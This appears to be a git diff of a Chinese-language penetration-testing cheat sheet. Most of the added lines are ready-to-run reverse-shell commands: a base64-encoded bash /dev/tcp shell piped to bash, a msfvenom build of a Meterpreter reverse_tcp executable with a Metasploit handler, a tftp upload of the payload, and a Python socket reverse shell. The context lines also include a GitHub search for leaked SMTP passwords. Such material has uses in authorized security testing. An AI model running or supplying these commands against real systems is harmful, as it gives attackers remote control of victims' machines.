@@ -996,6 +996,8 @@ site:Github.com String password smtp
 
 # 5.反弹shell
 
+
+
 ### bash反弹shell
 
 ```
@@ -1003,6 +1005,14 @@ site:Github.com String password smtp
 
 受害者：bash -i >& /dev/tcp/192.168.239.128/9999 0>&1
 ```
+
+#### base64编码
+
+```
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi45Lzk5OTkgMD4mMQ== | base64 -d | bash 
+```
+
+
 
 ### nc反弹shell
 
@@ -1100,12 +1110,32 @@ msfvenom -l payloads | grep 'cmd/windows/reverse'
 ```
 
 ```
-msfvenom -p cmd/windows/reverse_powershell LHOST=192.168.40.146 LPORT=4444
+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.204.149 lport=6688 -f exe -o shell.exe
 ```
 
+使用模块开启监听
+
+```
+use exploit/multi/handler
+```
+
+tftp上传默认是以ascii码的方式
+
+要转换为二进制上传
+
+```
+tftp>binary
+tftp>put /cgi-bin/shell.exe
+```
 
 然后MSF启动监听
 
 复制前面通过msfvenom生成的恶意代码到win7的cmd中执行即可。
 警告：有的文章说的是把那段恶意代码放到powershell中执行是不对的，也不能拿到session，至少我验证的结果是把代码放在cmd下执行才拿到session！
+
+### python反弹
+
+```
+cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.137.129",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'
+```
 
